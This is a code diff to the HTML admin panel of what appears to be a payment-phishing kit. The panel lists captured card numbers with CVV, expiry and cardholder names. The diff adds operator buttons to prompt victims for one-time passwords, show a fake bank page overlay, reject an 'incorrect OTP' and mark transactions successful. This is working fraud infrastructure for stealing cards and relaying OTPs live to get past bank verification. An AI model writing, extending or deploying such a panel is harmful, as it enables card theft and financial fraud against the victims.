@@ -7,14 +7,14 @@
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
     body {
-      background: #000; 
+      background: #000;
       color: #fff;
-      font-family: Arial, sans-serif; 
+      font-family: Arial, sans-serif;
       padding: 20px;
     }
-    h1 { 
-      text-align: center; 
-      margin-bottom: 20px; 
+    h1 {
+      text-align: center;
+      margin-bottom: 20px;
     }
     .container {
       max-width: 1200px;
@@ -59,31 +59,31 @@
       margin-left: 10px;
     }
     table {
-      width: 100%; 
+      width: 100%;
       border-collapse: collapse;
-      background: #111; 
+      background: #111;
       margin-bottom: 20px;
     }
     th, td {
-      padding: 10px; 
+      padding: 10px;
       border: 1px solid #333;
-      text-align: left; 
+      text-align: left;
       font-size: 12px;
     }
-    th { 
-      background: #222; 
+    th {
+      background: #222;
     }
-    tr:nth-child(even) { 
-      background: #222; 
+    tr:nth-child(even) {
+      background: #222;
     }
     button {
-      background: #4a90e2; 
+      background: #4a90e2;
       color: #fff;
-      border: none; 
-      padding: 6px 10px; 
+      border: none;
+      padding: 6px 10px;
       margin-right: 4px;
-      cursor: pointer; 
-      border-radius: 4px; 
+      cursor: pointer;
+      border-radius: 4px;
       font-size: 12px;
     }
     button:hover {
@@ -92,14 +92,6 @@
     button:disabled {
       background: #666;
       cursor: not-allowed;
-    }
-    .refresh-btn {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      padding: 10px 20px;
-      background: #22c55e;
-      font-size: 14px;
     }
     .status-badge {
       padding: 2px 6px;
@@ -118,24 +110,12 @@
       border-radius: 4px;
       font-size: 12px;
     }
-    .show-otp-btn {
-      background: #22c55e;
-    }
-    .bank-page-btn {
-      background: #8b5cf6;
-    }
-    .bank-page-btn:hover {
-      background: #7c3aed;
-    }
-    .show-otp-btn:disabled {
-      background: #666;
-    }
-    .wrong-otp-btn {
-      background: #ef4444;
-    }
-    .wrong-otp-btn:hover {
-      background: #dc2626;
-    }
+    .show-otp-btn { background: #22c55e; }
+    .bank-page-btn { background: #8b5cf6; }
+    .bank-page-btn:hover { background: #7c3aed; }
+    .show-otp-btn:disabled { background: #666; }
+    .wrong-otp-btn { background: #ef4444; }
+    .wrong-otp-btn:hover { background: #dc2626; }
   </style>
 </head>
 <body>
@@ -161,7 +141,7 @@
         <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
       </div>
     </div>
-
+    
     <h2>Transactions</h2>
     <table id="transactionsTable">
       <thead>
@@ -184,44 +164,33 @@
       </tbody>
     </table>
   </div>
-
+  
   <script src="/socket.io/socket.io.js"></script>
   <script>
     let transactions = new Map();
     let paymentLinks = new Map();
 
-    // --- Generate Payment Link Handler ---
+    // Generate Payment Link Handler – DO NOT REMOVE any existing code; just replace this block
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-      e.preventDefault(); // Prevent the form from refreshing the page
-      
+      e.preventDefault(); // Prevent page refresh
       const amountInput = document.getElementById('amount');
       const descInput = document.getElementById('description');
       const linkContainer = document.getElementById('paymentLinkContainer');
-
       try {
-        // Hide previous link display (if any)
         linkContainer.style.display = 'none';
-
-        // Get and validate input values
         const amount = parseFloat(amountInput.value);
         const description = descInput.value.trim();
         if (!amount || amount <= 0) throw new Error('Please enter a valid positive amount');
         if (!description) throw new Error('Description cannot be empty');
-
-        // Call the API endpoint to generate payment link
         const response = await fetch('/api/generatePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ amount, description })
         });
-
-        // Check for HTTP errors
         if (!response.ok) {
           const errorData = await response.json();
           throw new Error(errorData.message || 'Payment link generation failed');
         }
-
-        // Parse JSON response and display the payment link
         const data = await response.json();
         document.getElementById('paymentLink').textContent = data.paymentLink;
         linkContainer.style.display = 'block';
@@ -232,16 +201,13 @@
         linkContainer.style.display = 'none';
       }
     });
-    // --- End Generate Payment Link Handler ---
-
-    // Function to copy payment link to clipboard
+    
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
       navigator.clipboard.writeText(link);
       alert('Payment link copied to clipboard!');
     }
-
-    // (The rest of your existing code for loading transactions, handling OTP, etc., remains unchanged)
+    
     async function loadTransactions() {
       try {
         const response = await fetch("/api/transactions");
@@ -259,16 +225,35 @@
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
-            <td>${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : 'Waiting for OTP'}</td>
+            <td>
+              ${tx.otpEntered ? 
+                `<span class="otp-received">${tx.otpEntered}</span>
+                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
+                   Incorrect OTP
+                 </button>` : 
+                tx.otpShown ?
+                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
+                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    Show OTP
+                  </button>
+                  <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
+                    ${tx.bankpageVisible ? 'Hide Bankpage' : 'Bank Page'}
+                  </button>`
+              }
+            </td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
-                ${tx.status ? tx.status.toUpperCase() : 'PROCESSING'}
+                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
               </span>
             </td>
             <td>
               ${!tx.redirectStatus ? `
-                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>Success</button>
-                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>Fail</button>
+                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
+                  Success
+                </button>
+                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
+                  Fail
+                </button>
               ` : ''}
             </td>
           `;
@@ -279,7 +264,7 @@
         console.error('Error loading transactions:', error);
       }
     }
-
+    
     async function updateStatus(id, status) {
       try {
         const response = await fetch("/api/updateRedirectStatus", {
@@ -294,7 +279,7 @@
         alert('Failed to update status. Please try again.');
       }
     }
-
+    
     async function showOTP(id) {
       try {
         const response = await fetch("/api/showOTP", {
@@ -309,7 +294,7 @@
         alert('Failed to show OTP. Please try again.');
       }
     }
-
+    
     async function redirectToBankPage(id) {
       try {
         const response = await fetch("/api/redirectToBankPage", {
@@ -324,7 +309,7 @@
         alert('Failed to redirect to bank page. Please try again.');
       }
     }
-
+    
     async function markWrongOTP(id) {
       try {
         const response = await fetch("/api/wrongOTP", {
@@ -339,15 +324,12 @@
         alert('Failed to mark OTP as wrong. Please try again.');
       }
     }
-
+    
     async function toggleBankpage(id) {
       try {
-        const response = await fetch("/api/transactions");
-        const transactionsData = await response.json();
-        const txn = transactionsData.find(t => t.id === id);
-        if (!txn) {
-          throw new Error('Transaction not found');
-        }
+        // Retrieve transaction details from local copy
+        const txn = transactions.get(id);
+        if (!txn) throw new Error('Transaction not found');
         const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
         const apiResponse = await fetch(endpoint, {
           method: "POST",
@@ -364,15 +346,15 @@
         alert(`Error: ${error.message}`);
       }
     }
-
+    
     loadTransactions();
     setInterval(loadTransactions, 2000);
-
+    
     const socket = io();
     socket.on('refreshTransactions', () => {
       loadTransactions();
     });
-
+    
     window.onpopstate = function(event) {
       if (confirm("Do you want to cancel this transaction?")) {
         window.location.href = '/fail.html?reason=canceled';
@@ -387,5 +369,22 @@
   <div id="bankpageOverlay" class="fullscreen-overlay">
     <div class="spinner"></div>
   </div>
+  
+  <!-- New CSS for the fullscreen overlay -->
+  <style>
+    .fullscreen-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(5px);
+      z-index: 9999;
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
 </body>
 </html>
